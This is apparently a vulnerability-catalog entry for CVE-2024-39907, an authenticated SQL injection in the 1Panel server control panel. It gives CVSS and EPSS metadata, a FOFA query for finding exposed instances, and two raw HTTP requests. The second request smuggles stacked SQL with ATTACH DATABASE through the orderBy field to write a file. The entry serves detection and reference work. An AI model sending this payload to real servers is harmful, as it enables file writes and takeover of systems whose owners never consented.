---
layout: "post"
cve_id: "CVE-2024-39907"
title: "1Panel SQL Injection - Authenticated"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-39907.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-39907.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "critical"
reference:
  - "https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-5grx-v727-qmq6"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2024-39907"
  cwe-id: "CWE-89"
  epss-score: 0.84705
  epss-percentile: 0.99285
  cpe: "cpe:2.3:a:fit2cloud:1panel:*:*:*:*:*:*:*:*"
metadata:
  verified: True
  max-request: 2
  fofa-query: "icon_hash=\"1300107149\" || icon_hash=\"1453309674\" || cert.issuer.cn=\"1Panel Intermediate CA\""
  product: "1panel"
  vendor: "fit2cloud"
tags:
  - "cve"
  - "cve2024"
  - "sqli"
  - "1panel"
  - "authenticated"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
1Panel is a web-based linux server management control panel. There are many sql injections in the project, and some of them are not well filtered, leading to arbitrary file writes, and ultimately leading to RCEs. These sql injections have been resolved in version 1.10.12-tls. Users are advised to upgrade. There are no known workarounds for these issues.


## üåê HTTP Request
```nohighlight
POST /api/v1/auth/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:140.) Gecko/20100101 Firefox/140.
Connection: close
Content-Length: 99
Content-Type: application/json
EntranceCode: ZW50cmFuY2U=
Accept-Encoding: gzip

{"name":"QrEpMM","password":"kPwFpZFf","ignoreCaptcha":true,"authMethod":"session","language":"en"}
```

```nohighlight
POST /api/v1/hosts/command/search HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.15
Connection: close
Content-Length: 233
Content-Type: application/json
Accept-Encoding: gzip

{"page":1,"pageSize":10,"groupID":0,"orderBy":"3;ATTACH DATABASE '/tmp/36gsEvBw8sV4u1dv72kQXWsE7jS.txt' AS test;create TABLE test.exp (data text);create TABLE test.exp (data text);drop table test.exp;","order":"ascending","name":"a"}
```


